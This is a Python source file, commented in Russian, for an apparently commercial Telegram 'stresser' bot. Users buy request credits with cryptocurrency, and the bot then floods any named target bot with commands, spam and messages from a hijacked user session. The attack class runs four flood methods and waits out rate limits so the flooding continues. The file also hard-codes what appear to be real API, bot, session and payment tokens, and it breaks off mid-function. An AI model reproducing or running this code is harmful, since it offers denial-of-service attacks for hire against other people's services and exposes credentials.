import asyncio
import logging
import sqlite3
import hashlib
import random
import string
import json
import hmac
import aiohttp
from datetime import datetime, timedelta
from typing import Dict, List, Optional
from aiohttp import web

from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.tl.functions.users import GetFullUserRequest
from telethon.errors import FloodWaitError, ChatWriteForbiddenError

# ==================== НАСТРОЙКИ ====================
# ⬇⬇⬇ ЗАПОЛНИ ЭТИ ДАННЫЕ ⬇⬇⬇

API_ID = 34000428  # Получи на my.telegram.org
API_HASH = '68c4db995c26cda0187e723168cc6285'  # Получи на my.telegram.org
BOT_TOKEN = '8508366803:AAGuooJ4PdmJrwL8AAeWV3sNK4BAMJLegFY'  # Получи у @BotFather
STRESSER_SESSION_STRING = """1AgAOMTQ5LjE1NC4xNjcuNDEBuxDpjE0VYduD7dvnG+U+Q5vtLX+EtGO7tgAe+CG0ryX1xIuvUA9MbUt7v9anxRwC5vCi5j7oZ6Fs6BDkuhYyfGWwwt8sC8kNHkyEXkpv8kgZjMMoXnV1hV+Otnk0zE5YSUxHBeQDZekUfQtr9deCW5NI6XiLIyadCzltoLOFM5BKd+MggXARh4Hafy3Pdv84Rqtu5PYnBSc9JxK0Srd3gsZ3FIXfBavSYmRpXYil1S/bhfcmSAQpFg756fobQTdnPRSnsA/ov0GHHcpjH+pDpdDqlDU9HwJxerhjALksGdAvScIr2GL1+bZMRBqVO9Rj4EIKyn797NVfrFV9pQJIFjw="""  # Твоя StringSession

ADMIN_ID = 5522585352  # Твой ID Telegram
CHANNEL_USERNAME = '@WakeStreeser'  # Канал для подписки
SUPPORT_USERNAME = '@wakeGuarantee'  # Поддержка

# Цены
REQUEST_PRICE = 0.1  # $ за 1 запрос
REQUEST_DURATION = 15  # секунд за 1 запрос

# Crypto Pay
CRYPTO_PAY_TOKEN = '482874:AAuE5RiV2VKd55z0uQzPy18MMKsRvfu8DI2'  # От @CryptoBot
CRYPTO_PAY_WEBHOOK_SECRET = hashlib.md5(str(random.random()).encode()).hexdigest()  # Авто генерация
CRYPTO_PAY_WEBHOOK_PORT = 8080  # Порт для вебхука

# ⬆⬆⬆ ЗАПОЛНИ ЭТИ ДАННЫЕ ⬆⬆⬆
# ===================================================

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ==================== БАЗА ДАННЫХ ====================
class Database:
    def __init__(self, db_name='stresser_bot.db'):
        self.conn = sqlite3.connect(db_name, check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.init_db()
    
    def init_db(self):
        # Пользователи
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                captcha_passed BOOLEAN DEFAULT 0,
                captcha_answer TEXT,
                subscribed BOOLEAN DEFAULT 0,
                bio_checked BOOLEAN DEFAULT 0,
                requests_balance INTEGER DEFAULT 0,
                total_spent REAL DEFAULT 0,
                requests_used INTEGER DEFAULT 0,
                is_admin BOOLEAN DEFAULT 0,
                is_banned BOOLEAN DEFAULT 0,
                registration_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Промокоды
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS promo_codes (
                code TEXT PRIMARY KEY,
                requests INTEGER,
                uses_left INTEGER,
                created_by INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                expires_at TIMESTAMP
            )
        ''')
        
        # Использованные промокоды
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS used_promo_codes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                promo_code TEXT,
                used_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Инвойсы
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS crypto_invoices (
                invoice_id TEXT PRIMARY KEY,
                user_id INTEGER,
                amount_usd REAL,
                amount_crypto REAL,
                asset TEXT DEFAULT 'USDT',
                status TEXT DEFAULT 'active',
                crypto_pay_invoice_id TEXT,
                bot_invoice_url TEXT,
                pay_url TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                paid_at TIMESTAMP,
                expires_at TIMESTAMP
            )
        ''')
        
        # Атаки
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS attacks (
                attack_id TEXT PRIMARY KEY,
                user_id INTEGER,
                target TEXT,
                requests_used INTEGER,
                duration INTEGER,
                method TEXT,
                status TEXT,
                start_time TIMESTAMP,
                end_time TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        self.conn.commit()
    
    # ========== ПОЛЬЗОВАТЕЛИ ==========
    def get_user(self, user_id: int):
        self.cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        row = self.cursor.fetchone()
        if row:
            cols = [desc[0] for desc in self.cursor.description]
            return dict(zip(cols, row))
        return None
    
    def create_user(self, user_id: int, username: str):
        self.cursor.execute(
            'INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)',
            (user_id, username)
        )
        self.conn.commit()
        return self.get_user(user_id)
    
    def update_user(self, user_id: int, **kwargs):
        if not kwargs:
            return
        
        set_clause = ', '.join([f'{k}=?' for k in kwargs.keys()])
        values = list(kwargs.values()) + [user_id]
        self.cursor.execute(f'UPDATE users SET {set_clause} WHERE user_id=?', values)
        self.conn.commit()
    
    def add_requests(self, user_id: int, requests: int, reason: str = ''):
        user = self.get_user(user_id)
        if not user:
            return False
        
        new_balance = user['requests_balance'] + requests
        self.cursor.execute(
            'UPDATE users SET requests_balance = ? WHERE user_id = ?',
            (new_balance, user_id)
        )
        self.conn.commit()
        return True
    
    def use_requests(self, user_id: int, requests: int):
        user = self.get_user(user_id)
        if not user or user['requests_balance'] < requests:
            return False
        
        self.cursor.execute(
            '''UPDATE users 
               SET requests_balance = requests_balance - ?,
                   requests_used = requests_used + ?
               WHERE user_id = ?''',
            (requests, requests, user_id)
        )
        self.conn.commit()
        return True
    
    # ========== ПРОМОКОДЫ ==========
    def create_promo_code(self, code: str, requests: int, uses: int, created_by: int, expires_days: int = 30):
        expires_at = datetime.now() + timedelta(days=expires_days)
        self.cursor.execute(
            '''INSERT INTO promo_codes 
               (code, requests, uses_left, created_by, expires_at)
               VALUES (?, ?, ?, ?, ?)''',
            (code, requests, uses, created_by, expires_at)
        )
        self.conn.commit()
        return True
    
    def use_promo_code(self, user_id: int, code: str):
        # Проверяем промокод
        self.cursor.execute(
            '''SELECT requests, uses_left FROM promo_codes 
               WHERE code = ? AND (expires_at IS NULL OR expires_at > ?)''',
            (code, datetime.now())
        )
        promo = self.cursor.fetchone()
        if not promo:
            return None
        
        requests, uses_left = promo
        if uses_left <= 0:
            return None
        
        # Проверяем использовал ли уже
        self.cursor.execute(
            'SELECT id FROM used_promo_codes WHERE user_id = ? AND promo_code = ?',
            (user_id, code)
        )
        if self.cursor.fetchone():
            return None
        
        # Используем
        self.cursor.execute(
            'UPDATE promo_codes SET uses_left = uses_left - 1 WHERE code = ?',
            (code,)
        )
        self.cursor.execute(
            'INSERT INTO used_promo_codes (user_id, promo_code) VALUES (?, ?)',
            (user_id, code)
        )
        self.conn.commit()
        return requests
    
    # ========== ИНВОЙСЫ ==========
    def create_invoice(self, invoice_id: str, user_id: int, amount_usd: float, 
                      asset: str = 'USDT', crypto_pay_invoice_id: str = None,
                      bot_invoice_url: str = None, pay_url: str = None):
        expires_at = datetime.now() + timedelta(hours=24)
        self.cursor.execute(
            '''INSERT INTO crypto_invoices 
               (invoice_id, user_id, amount_usd, asset, crypto_pay_invoice_id,
                bot_invoice_url, pay_url, expires_at)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
            (invoice_id, user_id, amount_usd, asset, crypto_pay_invoice_id,
             bot_invoice_url, pay_url, expires_at)
        )
        self.conn.commit()
        return True
    
    def get_invoice(self, invoice_id: str):
        self.cursor.execute(
            'SELECT * FROM crypto_invoices WHERE invoice_id = ?',
            (invoice_id,)
        )
        row = self.cursor.fetchone()
        if row:
            cols = [desc[0] for desc in self.cursor.description]
            return dict(zip(cols, row))
        return None
    
    def get_invoice_by_pay_id(self, crypto_pay_invoice_id: str):
        self.cursor.execute(
            'SELECT * FROM crypto_invoices WHERE crypto_pay_invoice_id = ?',
            (crypto_pay_invoice_id,)
        )
        row = self.cursor.fetchone()
        if row:
            cols = [desc[0] for desc in self.cursor.description]
            return dict(zip(cols, row))
        return None
    
    def update_invoice(self, invoice_id: str, **kwargs):
        if not kwargs:
            return
        
        set_clause = ', '.join([f'{k}=?' for k in kwargs.keys()])
        values = list(kwargs.values()) + [invoice_id]
        self.cursor.execute(f'UPDATE crypto_invoices SET {set_clause} WHERE invoice_id=?', values)
        self.conn.commit()
    
    def mark_invoice_paid(self, invoice_id: str, amount_crypto: float):
        invoice = self.get_invoice(invoice_id)
        if not invoice:
            return False
        
        # Обновляем инвойс
        self.update_invoice(
            invoice_id,
            status='paid',
            amount_crypto=amount_crypto,
            paid_at=datetime.now()
        )
        
        # Начисляем запросы
        user_id = invoice['user_id']
        amount_usd = invoice['amount_usd']
        requests = int(amount_usd / REQUEST_PRICE)
        
        self.add_requests(user_id, requests)
        
        # Обновляем общие траты
        self.cursor.execute(
            'UPDATE users SET total_spent = total_spent + ? WHERE user_id = ?',
            (amount_usd, user_id)
        )
        
        self.conn.commit()
        return True
    
    # ========== АТАКИ ==========
    def create_attack(self, attack_id: str, user_id: int, target: str, 
                     requests_used: int, duration: int, method: str):
        self.cursor.execute(
            '''INSERT INTO attacks 
               (attack_id, user_id, target, requests_used, duration, method, status, start_time)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
            (attack_id, user_id, target, requests_used, duration, method, 'running', datetime.now())
        )
        self.conn.commit()
        return True
    
    def update_attack(self, attack_id: str, status: str, requests_sent: int = None):
        if requests_sent is not None:
            self.cursor.execute(
                '''UPDATE attacks 
                   SET status = ?, end_time = ?, requests_used = ?
                   WHERE attack_id = ?''',
                (status, datetime.now(), requests_sent, attack_id)
            )
        else:
            self.cursor.execute(
                '''UPDATE attacks 
                   SET status = ?, end_time = ?
                   WHERE attack_id = ?''',
                (status, datetime.now(), attack_id)
            )
        self.conn.commit()
    
    def get_user_attacks(self, user_id: int, limit: int = 10):
        self.cursor.execute(
            'SELECT * FROM attacks WHERE user_id = ? ORDER BY created_at DESC LIMIT ?',
            (user_id, limit)
        )
        rows = self.cursor.fetchall()
        cols = [desc[0] for desc in self.cursor.description]
        return [dict(zip(cols, row)) for row in rows]
    
    # ========== АДМИНКА ==========
    def get_stats(self):
        stats = {}
        
        queries = [
            ('total_users', 'SELECT COUNT(*) FROM users'),
            ('active_users', 'SELECT COUNT(*) FROM users WHERE requests_balance > 0'),
            ('total_requests', 'SELECT SUM(requests_balance) FROM users'),
            ('total_used', 'SELECT SUM(requests_used) FROM users'),
            ('total_income', 'SELECT SUM(amount_usd) FROM crypto_invoices WHERE status = "paid"'),
            ('total_attacks', 'SELECT COUNT(*) FROM attacks'),
            ('new_users_today', 'SELECT COUNT(*) FROM users WHERE DATE(registration_date) = DATE("now")'),
            ('attacks_today', 'SELECT COUNT(*) FROM attacks WHERE DATE(start_time) = DATE("now")')
        ]
        
        for key, query in queries:
            self.cursor.execute(query)
            result = self.cursor.fetchone()[0]
            stats[key] = result if result is not None else 0
        
        return stats
    
    def get_all_users(self, limit: int = 50):
        self.cursor.execute(
            'SELECT * FROM users ORDER BY registration_date DESC LIMIT ?',
            (limit,)
        )
        rows = self.cursor.fetchall()
        cols = [desc[0] for desc in self.cursor.description]
        return [dict(zip(cols, row)) for row in rows]
    
    def close(self):
        self.conn.close()

# ==================== CRYPTO PAY API ====================
class CryptoPayAPI:
    def __init__(self, token: str):
        self.token = token
        self.base_url = 'https://pay.crypt.bot/api'
        self.headers = {
            'Crypto-Pay-API-Token': token,
            'Content-Type': 'application/json'
        }
    
    async def _request(self, method: str, endpoint: str, **kwargs):
        url = f"{self.base_url}/{endpoint}"
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.request(method, url, headers=self.headers, **kwargs) as response:
                    data = await response.json()
                    if data.get('ok'):
                        return data.get('result')
                    else:
                        logger.error(f"Crypto Pay API Error: {data}")
                        return None
        except Exception as e:
            logger.error(f"Crypto Pay request error: {e}")
            return None
    
    async def create_invoice(self, asset: str, amount: float, description: str = "", 
                           payload: str = "", allow_anonymous: bool = True):
        """Создание инвойса"""
        data = {
            "asset": asset,
            "amount": str(amount),
            "description": description,
            "payload": payload,
            "allow_anonymous": allow_anonymous,
            "paid_btn_name": "callback",
            "paid_btn_url": ""
        }
        
        return await self._request('POST', 'createInvoice', json=data)
    
    async def get_balance(self):
        """Получение баланса"""
        return await self._request('GET', 'getBalance')
    
    async def get_exchange_rates(self):
        """Получение курсов"""
        return await self._request('GET', 'getExchangeRates')

# ==================== КАПТЧА ====================
class CaptchaSystem:
    @staticmethod
    def generate():
        a = random.randint(1, 20)
        b = random.randint(1, 20)
        op = random.choice(['+', '-', '*'])
        
        if op == '+':
            answer = a + b
        elif op == '-':
            answer = a - b
        else:
            answer = a * b
        
        question = f"{a} {op} {b} = ?"
        return question, str(answer)

# ==================== СТРЕССЕР ====================
class BotStresser:
    def __init__(self, client):
        self.client = client
        self.active_attacks = {}
    
    async def stress_bot(self, bot_username: str, requests_count: int, method: str = "mixed"):
        """Запуск атаки"""
        try:
            # Проверка на своих ботов
            if any(x in bot_username.lower() for x in ['wake', 'stress', 'stresser']):
                return {'success': False, 'error': 'Нельзя атаковать своих ботов'}
            
            bot = await self.client.get_entity(bot_username)
            attack_id = f"ATK{random.randint(100000, 999999)}"
            
            self.active_attacks[attack_id] = {
                'target': bot_username,
                'requests': requests_count,
                'method': method,
                'start_time': datetime.now(),
                'requests_sent': 0,
                'status': 'running'
            }
            
            # Запускаем в фоне
            asyncio.create_task(self._execute_attack(attack_id, bot, requests_count, method))
            
            return {
                'success': True,
                'attack_id': attack_id,
                'duration': requests_count * REQUEST_DURATION
            }
            
        except Exception as e:
            logger.error(f"Stress bot error: {e}")
            return {'success': False, 'error': str(e)}
    
    async def _execute_attack(self, attack_id: str, bot_entity, requests: int, method: str):
        """Выполнение атаки"""
        attack = self.active_attacks.get(attack_id)
        if not attack:
            return
        
        methods = {
            "mixed": self._mixed_attack,
            "flood": self._flood_attack,
            "commands": self._commands_attack,
            "spam": self._spam_attack
        }
        
        attack_func = methods.get(method, self._mixed_attack)
        
        try:
            await attack_func(attack_id, bot_entity, requests)
        except Exception as e:
            logger.error(f"Attack error {attack_id}: {e}")
        finally:
            attack['status'] = 'completed'
            attack['end_time'] = datetime.now()
    
    async def _mixed_attack(self, attack_id: str, bot_entity, requests: int):
        """Смешанная атака"""
        for i in range(requests):
            if self.active_attacks[attack_id]['status'] != 'running':
                break
            
            try:
                # Случайное действие
                actions = [
                    lambda: self.client.send_message(bot_entity, random.choice(['/start', '/help', '/test'])),
                    lambda: self.client.send_message(bot_entity, random.choice(['ping', 'test', 'hello'])),
                    lambda: self.client.send_message(bot_entity, random.choice(['👍', '👎', '❤️']))
                ]
                
                await random.choice(actions)()
                self.active_attacks[attack_id]['requests_sent'] += 1
                
                # Случайная задержка
                await asyncio.sleep(random.uniform(0.1, 0.5))
                
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds)
            except Exception:
                await asyncio.sleep(0.5)
    
    async def _flood_attack(self, attack_id: str, bot_entity, requests: int):
        """Флуд атака"""
        for i in range(requests):
            if self.active_attacks[attack_id]['status'] != 'running':
                break
            
            try:
                await self.client.send_message(bot_entity, random.choice(['test', 'ping', 'check']))
                self.active_attacks[attack_id]['requests_sent'] += 1
                await asyncio.sleep(0.1)
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds)
            except Exception:
                await asyncio.sleep(0.3)
    
    async def _commands_attack(self, attack_id: str, bot_entity, requests: int):
        """Атака командами"""
        commands = ['/start', '/help', '/menu', '/info', '/balance', '/profile']
        
        for i in range(requests):
            if self.active_attacks[attack_id]['status'] != 'running':
                break
            
            try:
                await self.client.send_message(bot_entity, random.choice(commands))
                self.active_attacks[attack_id]['requests_sent'] += 1
                await asyncio.sleep(0.3)
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds)
            except Exception:
                await asyncio.sleep(0.5)
    
    async def _spam_attack(self, attack_id: str, bot_entity, requests: int):
        """Спам атака"""
        spam_text = "🚀" * 30
        
        for i in range(requests):
            if self.active_attacks[attack_id]['status'] != 'running':
                break
            
            try:
                await self.client.send_message(bot_entity, spam_text)
                self.active_attacks[attack_id]['requests_sent'] += 1
                await asyncio.sleep(1)
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds)
            except Exception:
                await asyncio.sleep(2)
    
    def stop_attack(self, attack_id: str):
        """Остановка атаки"""
        if attack_id in self.active_attacks:
            self.active_attacks[attack_id]['status'] = 'stopped'
            return True
        return False

# ==================== ОСНОВНОЙ БОТ ====================
class WakeStresserBot:
    def __init__(self):
        self.db = Database()
        self.captcha = CaptchaSystem()
        self.crypto_api = CryptoPayAPI(CRYPTO_PAY_TOKEN) if CRYPTO_PAY_TOKEN else None
        self.stresser = None
        
        # Инициализация бота
        self.bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
        
        # Инициализация юзербота с твоей StringSession
        self.userbot = TelegramClient(
            StringSession(STRESSER_SESSION_STRING),
            API_ID,
            API_HASH
        )
        
        # Вебхук для Crypto Pay
        self.webhook_app = web.Application()
        self.setup_webhook()
        
        # Регистрация обработчиков
        self.register_handlers()
    
    def setup_webhook(self):
        """Настройка вебхука для Crypto Pay"""
        routes = web.RouteTableDef()
        
        @routes.post('/crypto_webhook')
        async def crypto_webhook(request):
            # Проверка подписи
            signature = request.headers.get('Crypto-Pay-Api-Signature', '')
            body = await request.read()
            
            # Генерация ожидаемой подписи
            expected_sig = hmac.new(
                CRYPTO_PAY_WEBHOOK_SECRET.encode(),
                body,
                hashlib.sha256
            ).hexdigest()
            
            if not hmac.compare_digest(signature, expected_sig):
                return web.Response(status=403, text='Invalid signature')
            
            try:
                data = await request.json()
                await self.handle_crypto_webhook(data)
                return web.Response(text='OK')
            except Exception as e:
                logger.error(f"Webhook error: {e}")
                return web.Response(status=500, text='Error')
        
        self.webhook_app.add_routes(routes)
    
    async def handle_crypto_webhook(self, data: dict):
        """Обработка вебхука от Crypto Pay"""
        update_type = data.get('update_type')
        
        if update_type == 'invoice_paid':
            invoice_data = data.get('payload', {}).get('invoice', {})
            invoice_id = invoice_data.get('invoice_id')
            amount = float(invoice_data.get('amount', 0))
            
            # Ищем инвойс в базе
            invoice = self.db.get_invoice_by_pay_id(invoice_id)
            if invoice:
                # Помечаем как оплаченный
                self.db.mark_invoice_paid(invoice['invoice_id'], amount)
                
                # Уведомляем пользователя
                user_id = invoice['user_id']
                requests = int(invoice['amount_usd'] / REQUEST_PRICE)
                
                await self.bot.send_message(
                    user_id,
                    f"✅ **Оплата получена!**\n\n"
                    f"💰 Сумма: ${invoice['amount_usd']:.2f}\n"
                    f"🎁 Зачислено: {requests} запросов\n"
                    f"📊 Теперь можете запускать атаки!"
                )
                
                logger.info(f"Payment received: invoice {invoice_id}, user {user_id}")
    
    async def start_webhook_server(self):
        """Запуск сервера вебхука"""
        runner = web.AppRunner(self.webhook_app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', CRYPTO_PAY_WEBHOOK_PORT)
        await site.start()
        logger.info(f"Webhook server started on port {CRYPTO_PAY_WEBHOOK_PORT}")
    
    def register_handlers(self):
        # ========== START ==========
        @self.bot.on(events.NewMessage(pattern='/start'))
        async def start_handler(event):
            user_id = event.sender_id
            username = event.sender.username or ''
            
            # Создаем/получаем пользователя
            user = self.db.get_user(user_id)
            if not user:
                user = self.db.create_user(user_id, username)
            
            self.db.update_user(user_id, last_active=datetime.now())
            
            # Проверка капчи
            if not user['captcha_passed']:
                question, answer = self.captcha.generate()
                self.db.update_user(user_id, captcha_answer=answer)
                
                await event.respond(
                    f"🔐 **Проверка безопасности**\n\n"
                    f"Решите пример: {question}\n"
                    f"Отправьте ответ числом в чат.",
                    buttons=Button.clear()
                )
                return
            
            # Проверка подписки
            if not user['subscribed']:
                await event.respond(
                    f"📢 **Требуется подписка**\n\n"
                    f"Для использования бота необходимо подписаться на канал:\n"
                    f"{CHANNEL_USERNAME}\n\n"
                    f"После подписки нажмите кнопку ниже:",
                    buttons=[
                        [Button.url("📢 Подписаться", f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")],
                        [Button.inline("✅ Проверить подписку", b"check_sub")]
                    ]
                )
                return
            
            # Проверка Bio
            if not user['bio_checked']:
                await event.respond(
                    "📝 **Требуется настройка профиля**\n\n"
                    "Добавьте в описание профиля Telegram:\n"
                    "`@WakeStresserBot`\n\n"
                    "После добавления нажмите кнопку ниже:",
                    buttons=[[Button.inline("🔍 Проверить Bio", b"check_bio")]]
                )
                return
            
            # Все проверки пройдены
            await self.show_main_menu(event)
        
        # ========== ОБРАБОТКА КАПЧИ ==========
        @self.bot.on(events.NewMessage)
        async def captcha_handler(event):
            user_id = event.sender_id
            user = self.db.get_user(user_id)
            
            if not user or user['captcha_passed']:
                return
            
            user_answer = event.message.text.strip()
            correct_answer = user.get('captcha_answer', '')
            
            if user_answer == correct_answer:
                self.db.update_user(user_id, captcha_passed=True)
                await event.respond("✅ Капча пройдена успешно!")
                
                await event.respond(
                    f"📢 Теперь подпишитесь на канал:\n{CHANNEL_USERNAME}",
                    buttons=[
                        [Button.url("📢 Подписаться", f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")],
                        [Button.inline("✅ Проверить подписку", b"check_sub")]
                    ]
                )
            else:
                question, answer = self.captcha.generate()
                self.db.update_user(user_id, captcha_answer=answer)
                await event.respond(
                    f"❌ Неверный ответ!\n\nНовый пример: {question}\nОтправьте ответ числом:"
                )
        
        # ========== CALLBACK ОБРАБОТЧИКИ ==========
        @self.bot.on(events.CallbackQuery)
        async def callback_handler(event):
            data = event.data.decode()
            
            # Проверка подписки
            if data == 'check_sub':
                subscribed = await self.check_subscription(event.sender_id)
                if subscribed:
                    self.db.update_user(event.sender_id, subscribed=True)
                    await event.edit(
                        "✅ Подписка подтверждена!\n\n"
                        "Теперь добавьте в описание профиля:\n"
                        "`@WakeStresserBot`",
                        buttons=[[Button.inline("🔍 Проверить Bio", b"check_bio")]]
                    )
                else:
                    await event.answer("❌ Вы не подписаны на канал!", alert=True)
            
            # Проверка Bio
            elif data == 'check_bio':
                bio_ok = await self.check_bio(event.sender_id)
                if bio_ok:
                    self.db.update_user(event.sender_id, bio_checked=True)
                    await event.edit("✅ Bio проверено успешно!")
                    await self.show_main_menu(event)
                else:
                    await event.answer("❌ Bio не содержит ссылку на бота!", alert=True)
            
            # Главное меню
            elif data == 'main_menu':
                await self.show_main_menu(event)
            
            # Купить запросы
            elif data == 'buy_requests':
                await self.show_buy_menu(event)
            
            # Выбор количества запросов
            elif data.startswith('buy_'):
                try:
                    amount = int(data.split('_')[1])
                    await self.process_payment(event, amount)
                except:
                    await event.answer("❌ Ошибка!", alert=True)
            
            # Стресс меню
            elif data == 'stress_menu':
                await self.show_stress_menu(event)
            
            # Статистика
            elif data == 'my_stats':
                await self.show_stats(event)
            
            # Помощь
            elif data == 'help':
                await event.respond(
                    f"🆘 **Помощь**\n\n"
                    f"По всем вопросам обращайтесь:\n"
                    f"{SUPPORT_USERNAME}",
                    buttons=Button.clear()
                )
            
            # Активация промокода
            elif data == 'activate_promo':
                await event.respond(
                    "🎁 **Активация промокода**\n\n"
                    "Отправьте промокод в чат в формате:\n"
                    "`PROMO ваш_промокод`\n\n"
                    "Пример: `PROMO WELCOME100`"
                )
            
            # Админ панель
            elif data == 'admin_panel' and event.sender_id == ADMIN_ID:
                await self.show_admin_panel(event)
    
    async def show_main_menu(self, event):
        user = self.db.get_user(event.sender_id)
        balance = user['requests_balance'] if user else 0
        
        buttons = [
            [Button.inline("🛒 Купить запросы", b"buy_requests")],
            [Button.inline("⚡ Запустить Stress", b"stress_menu")],
            [Button.inline("🎁 Активировать промокод", b"activate_promo")],
            [Button.inline("📊 Моя статистика", b"my_stats"),
             Button.inline("🆘 Помощь", b"help")]
        ]
        
        if event.sender_id == ADMIN_ID:
            buttons.append([Button.inline("👑 Админ панель", b"admin_panel")])
        
        await event.respond(
            f"🔥 **Wake Stresser Bot**\n\n"
            f"📊 Ваш баланс: `{balance}` запросов\n"
            f"💰 1 запрос = ${REQUEST_PRICE}\n"
            f"⏱️ 1 запрос = {REQUEST_DURATION} секунд\n\n"
            f"💳 **Оплата через Crypto Pay**\n"
            f"Поддерживаемые активы: USDT, TON, BTC, ETH\n\n"
            f"Выберите действие:",
            buttons=buttons
        )
    
    async def show_buy_menu(self, event):
        await event.edit(
            "🛒 **Покупка запросов**\n\n"
            f"1 запрос = ${REQUEST_PRICE} = {REQUEST_DURATION} секунд\n\n"
            "Выберите количество запросов:",
            buttons=[
                [Button.inline("🔟 10 запросов ($1)", b"buy_10"),
                 Button.inline("💯 100 запросов ($10)", b"buy_100")],
                [Button.inline("🔥 500 запросов ($50)", b"buy_500"),
                 Button.inline("💥 1000 запросов ($100)", b"buy_1000")],
                [Button.inline("🔙 Назад", b"main_menu")]
            ]
        )
    
    async def process_payment(self, event, requests):
        user_id = event.sender_id
        amount_usd = requests * REQUEST_PRICE
        
        await event.edit(f"⏳ Создаю платёжную ссылку...")
        
        if not self.crypto_api:
            await event.edit("❌ Платежная система не настроена!")
            return
        
        # Получаем курс USDT
        rates = await self.crypto_api.get_exchange_rates()
        if not rates:
            await event.edit("❌ Ошибка получения курсов!")
            return
        
        # Ищем курс USDT/USD
        usdt_rate = 1.0
        for rate in rates:
            if rate.get('source') == 'USDT' and rate.get('target') == 'USD':
                usdt_rate = float(rate.get('rate', 1))
                break
        
        # Рассчитываем сумму в USDT
        amount_crypto = amount_usd / usdt_rate
        amount_crypto = round(amount_crypto, 6)
        
        # Создаем инвойс в Crypto Pay
        invoice_data = await self.crypto_api.create_invoice(
            asset='USDT',
            amount=amount_crypto,
            description=f"Оплата {requests} запросов",
            payload=f"user:{user_id}"
        )
        
        if not invoice_data:
            await event.edit("❌ Ошибка создания платежа!")
            return
        
        # Сохраняем в базу
        invoice_id = f"INV{random.randint(100000, 999999)}"
        self.db.create_invoice(
            invoice_id=invoice_id,
            user_id=user_id,
            amount_usd=amount_usd,
            asset='USDT',
            crypto_pay_invoice_id=invoice_data.get('invoice_id'),
            bot_invoice_url=invoice_data.get('bot_invoice_url'),
            pay_url=invoice_data.get('pay_url')
        )
        
        # Формируем сообщение
        message = (
            f"💳 **Оплата {requests} запросов**\n\n"
            f"📊 Запросов: {requests}\n"
            f"💰 Сумма: ${amount_usd:.2f}\n"
            f"💎 К оплате: {amount_crypto} USDT\n"
            f"⏱️ Длительность: {requests * REQUEST_DURATION} сек\n\n"
        )
        
        buttons = []
        
        if invoice_data.get('pay_url'):
            message += "🔗 **Прямая ссылка на оплату:**\n"
            buttons.append([Button.url("🔗 Оплатить напрямую", invoice_data['pay_url'])])
        
        if invoice_data.get('bot_invoice_url'):
            message += "🤖 **Оплата через @CryptoBot:**\n"
            buttons.append([Button.url("🤖 Оплатить в CryptoBot", invoice_data['bot_invoice_url'])])
        
        message += f"\n🆔 ID платежа: `{invoice_id}`\n"
        message += f"⏳ Ссылка действительна 24 часа"
        
        buttons.append([Button.inline("✅ Проверить оплату", f"check_pay_{invoice_id}")])
        buttons.append([Button.inline("❌ Отмена", b"buy_requests")])
        
        await event.edit(message, buttons=buttons)
    
    async def show_stress_menu(self, event):
        user = self.db.get_user(event.sender_id)
        
        if not user or user['requests_balance'] <= 0:
            await event.answer("❌ У вас нет запросов на балансе!", alert=True)
            return
        
        await event.edit(
            f"⚡ **Запуск Stress теста**\n\n"
            f"📊 Доступно запросов: {user['requests_balance']}\n"
            f"⏱️ 1 запрос = {REQUEST_DURATION} секунд\n\n"
            "**Формат команды:**\n"
            "`@username количество_запросов [метод]`\n\n"
            "**Примеры:**\n"
            "`@testbot 100` - 100 запросов (mixed)\n"
            "`@targetbot 50 flood` - 50 запросов флудом\n\n"
            "**Доступные методы:**\n"
            "• mixed (по умолчанию)\n"
            "• flood\n"
            "• commands\n"
            "• spam\n\n"
            "**Защита:** Нельзя атаковать ботов с 'wake', 'stress' в имени\n\n"
            "Отправьте команду в чат:",
            buttons=[[Button.inline("🔙 Назад", b"main_menu")]]
        )
    
    async def show_stats(self, event):
        user = self.db.get_user(event.sender_id)
        if not user:
            return
        
        attacks = self.db.get_user_attacks(event.sender_id, limit=5)
        
        stats_text = f"📊 **Ваша статистика**\n\n"
        stats_text += f"🆔 ID: `{user['user_id']}`\n"
        stats_text += f"📛 Username: @{user['username'] or 'нет'}\n"
        stats_text += f"💰 Баланс: `{user['requests_balance']}` запросов\n"
        stats_text += f"📤 Использовано: `{user['requests_used']}` запросов\n"
        stats_text += f"💵 Потрачено: `${user['total_spent'] or 0:.2f}`\n"
        stats_text += f"📅 Регистрация: `{user['registration_date'][:10] if user['registration_date'] else 'нет'}`\n\n"
        
        if attacks:
            stats_text += "📈 **Последние атаки:**\n"
            for attack in attacks[:3]:
                stats_text += f"• @{attack['target']} - {attack['requests_used']} запросов\n"
        
        await event.edit(
            stats_text,
            buttons=[[Button.inline("🔙 Назад", b"main_menu")]]
        )
    
    async def show_admin_panel(self, event):
        if event.sender_id != ADMIN_ID:
            await event.answer("❌ Доступ запрещён!", alert=True)
            return
        
        stats = self.db.get_stats()
        
        await event.edit(
